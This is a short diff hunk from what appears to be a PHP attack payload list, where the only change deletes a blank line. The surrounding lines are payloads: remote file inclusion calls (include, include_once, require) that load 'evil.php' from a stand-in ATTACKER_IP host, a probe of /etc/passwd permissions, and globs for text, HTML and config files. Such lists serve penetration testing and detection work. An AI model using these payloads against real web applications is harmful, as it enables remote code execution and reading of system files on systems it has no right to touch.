@@ -62,7 +62,6 @@ ECHO%20FILEPERMS("/etc/passwd");
 print_r(glob("*.txt"));
 print_r(glob("*.html"));
 print_r(glob("*.config"));
-
 include("http://ATTACKER_IP/evil.php")
 include_once("http://ATTACKER_IP/evil.php")
 require("http://ATTACKER_IP/evil.php")
